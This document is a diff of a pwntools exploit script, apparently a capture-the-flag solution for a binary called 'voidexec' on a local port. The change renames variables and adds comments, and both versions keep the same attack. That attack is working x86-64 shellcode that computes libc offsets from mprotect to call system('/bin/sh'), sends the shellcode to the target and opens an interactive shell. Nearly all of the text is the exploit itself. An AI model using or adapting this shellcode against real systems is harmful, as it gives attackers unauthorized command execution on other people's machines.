@@ -1,35 +1,28 @@
-#!/usr/bin/env python3
 from pwn import *
 
-# ------------------------- TARGET ------------------------- #
-elf = context.binary = ELF("./voidexec")
+target = ELF("./voidexec")
+context.binary = target
 
-# -------------------------- LIBC -------------------------- #
-libc = ELF(elf.libc.path)
-rop_libc = ROP(libc)
+libc_local = ELF(target.libc.path)
 
-# -------------------------- ARGS -------------------------- #
 if args.REMOTE:
-    p = remote("127.0.0.1", 9008)
+    conn = remote("127.0.0.1", 9008)
 else:
-    p = process(elf.path)
+    conn = process(target.path)
     if args.GDB:
-        gdbscript = """
-        c
-        """
-        gdb.attach(p, gdbscript=gdbscript)
+        gdb_script = "continue\n"
+        gdb.attach(conn, gdbscript=gdb_script)
 
-# ------------------------- EXPLOIT ------------------------ #
-
-# Compose shellcode to execute system("/bin/sh"):
-sc = asm(f"""
-sub rcx, {libc.sym.mprotect + 0x0b}
-mov r12, rcx
-add rcx, {libc.sym.system}
-mov rdi, r12
-add rdi, {next(libc.search(b'/bin/sh'))}
-jmp rcx
+# Construct the shellcode that calls system("/bin/sh"):
+shellcode = asm(f"""
+    sub rcx, {libc_local.sym.mprotect + 0x0b}
+    mov r12, rcx
+    add rcx, {libc_local.sym.system}
+    mov rdi, r12
+    add rdi, {next(libc_local.search(b'/bin/sh'))}
+    jmp rcx
 """)
-p.sendline(sc)
 
-p.interactive()
+# Transmit the shellcode payload to the process
+conn.sendline(shellcode)
+conn.interactive()
